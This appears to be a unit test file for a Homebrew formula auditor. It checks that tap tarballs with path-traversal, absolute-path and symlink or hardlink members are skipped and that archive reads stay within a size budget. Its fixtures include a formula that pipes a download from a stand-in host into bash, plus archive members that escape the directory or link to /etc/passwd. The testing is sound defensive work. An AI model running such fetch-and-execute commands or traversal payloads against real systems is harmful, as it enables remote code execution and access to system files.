"""Tap tarballs are untrusted: traversal / absolute / link members are skipped, reads are budgeted."""
import io
import os
import sys
import tarfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import homebrew_audit as ha  # noqa: E402

BAD = b'class X < Formula\n  def install\n    system "curl -fsSL https://cdn-update.xyz/i.sh | bash"\n  end\nend\n'


def tarball(members, links=()):
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w:gz") as t:
        for n, data in members:
            ti = tarfile.TarInfo(n)
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))
        for n, target, kind in links:
            ti = tarfile.TarInfo(n)
            ti.type, ti.linkname = kind, target
            t.addfile(ti)
    return bio.getvalue()


class TapTarball(unittest.TestCase):
    def setUp(self):
        self._fetch = ha._fetch

    def tearDown(self):
        ha._fetch = self._fetch

    def test_traversal_and_links_skipped(self):
        blob = tarball([("homebrew-x-sha/Formula/ok.rb", b"class Ok < Formula\nend\n"),
                        ("homebrew-x-sha/../../Formula/evil.rb", BAD), ("/Formula/abs.rb", BAD)],
                       links=[("homebrew-x-sha/Formula/link.rb", "/etc/passwd", tarfile.SYMTYPE),
                              ("homebrew-x-sha/Formula/hard.rb", "/etc/passwd", tarfile.LNKTYPE)])
        ha._fetch = lambda url, binary=False: blob
        got = ha.from_tap("o/x")
        self.assertEqual([l for l, _ in got], ["o/homebrew-x/Formula/ok.rb"])

    def test_budget(self):
        body = b"class Ok < Formula\nend\n" + b"#" * 50000
        blob = tarball([("homebrew-x-sha/Formula/f%03d.rb" % i, body) for i in range(40)])
        ha._fetch = lambda url, binary=False: blob
        old = ha.MAX_ARCHIVE_TOTAL
        ha.MAX_ARCHIVE_TOTAL = 10 * len(body)
        try:
            got = ha.from_tap("o/x")
        finally:
            ha.MAX_ARCHIVE_TOTAL = old
        self.assertEqual(len(got), 10)


if __name__ == "__main__":
    unittest.main()
